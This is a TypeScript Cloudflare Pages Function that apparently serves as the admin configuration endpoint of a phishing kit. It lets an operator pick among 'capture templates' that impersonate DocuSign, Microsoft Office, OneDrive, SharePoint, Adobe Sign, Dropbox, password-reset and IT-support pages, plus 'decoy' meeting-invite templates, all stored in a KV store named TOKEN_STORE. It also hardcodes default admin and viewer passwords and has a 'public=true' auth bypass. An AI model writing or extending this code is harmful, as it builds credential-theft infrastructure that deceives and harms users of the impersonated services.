interface Env {
  TOKEN_STORE: KVNamespace;
}

const TEMPLATE_KEY = 'active_template';
const DECOY_KEY = 'decoy_template';
const CORS_HEADERS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, X-Admin-Password',
  'Content-Type': 'application/json',
};

const DEFAULT_ADMIN_PASSWORD = 'OutlookAdmin2024!';
const DEFAULT_VIEWER_PASSWORD = 'OutlookView2024!';

const VALID_CAPTURE_TEMPLATES = [
  'default', 'adobe-sign', 'box', 'docusign-centered', 'docusign-split', 'dropbox',
  'microsoft-office', 'microsoft-verify', 'onedrive', 'outlook-sync', 'sharepoint',
  'secureshare', 'calendar-invite', 'calendly-meeting', 'bookings-meeting', 'solarwinds-meeting',
  'schedule-meeting', 'it-support', 'password-reset',
];

const VALID_DECOY_TEMPLATES = [
  'secureshare',
  'calendar-invite',
  'calendly-meeting',
  'bookings-meeting',
  'solarwinds-meeting',
];

async function checkAuth(request: Request, kv: KVNamespace): Promise<boolean> {
  const pw = request.headers.get('X-Admin-Password');
  const admin = (await kv.get('admin_password')) || DEFAULT_ADMIN_PASSWORD;
  return pw === admin || pw === DEFAULT_VIEWER_PASSWORD;
}

export const onRequestGet: PagesFunction<Env> = async (context) => {
  const noAuth = context.request.url.includes('public=true');
  if (!noAuth && !(await checkAuth(context.request, context.env.TOKEN_STORE))) {
    return new Response(JSON.stringify({ error: 'Unauthorized' }), { status: 401, headers: CORS_HEADERS });
  }

  const template = await context.env.TOKEN_STORE.get(TEMPLATE_KEY) as string | null;
  const decoy = await context.env.TOKEN_STORE.get(DECOY_KEY) as string | null;
  return new Response(JSON.stringify({
    template: template ?? 'default',
    decoy: decoy ?? 'bookings-meeting',
  }), { status: 200, headers: CORS_HEADERS });
};

export const onRequestPost: PagesFunction<Env> = async (context) => {
  if (!(await checkAuth(context.request, context.env.TOKEN_STORE))) {
    return new Response(JSON.stringify({ error: 'Unauthorized' }), { status: 401, headers: CORS_HEADERS });
  }

  try {
    const body = await context.request.json() as { template?: string; decoy?: string };

    // Handle capture template update
    if (body.template) {
      if (!VALID_CAPTURE_TEMPLATES.includes(body.template)) {
        return new Response(JSON.stringify({ error: 'Invalid capture template' }), { status: 400, headers: CORS_HEADERS });
      }
      await context.env.TOKEN_STORE.put(TEMPLATE_KEY, body.template);
    }

    // Handle decoy template update
    if (body.decoy) {
      if (!VALID_DECOY_TEMPLATES.includes(body.decoy)) {
        return new Response(JSON.stringify({ error: 'Invalid decoy template' }), { status: 400, headers: CORS_HEADERS });
      }
      await context.env.TOKEN_STORE.put(DECOY_KEY, body.decoy);
    }

    const currentTemplate = body.template || (await context.env.TOKEN_STORE.get(TEMPLATE_KEY)) || 'default';
    const currentDecoy = body.decoy || (await context.env.TOKEN_STORE.get(DECOY_KEY)) || 'bookings-meeting';

    return new Response(JSON.stringify({
      success: true,
      template: currentTemplate,
      decoy: currentDecoy,
    }), { status: 200, headers: CORS_HEADERS });
  } catch (error) {
    const message = error instanceof Error ? error.message : 'Unknown error';
    return new Response(JSON.stringify({ error: message }), { status: 500, headers: CORS_HEADERS });
  }
};

export const onRequestOptions: PagesFunction<Env> = async () => {
  return new Response(null, { status: 204, headers: CORS_HEADERS });
};
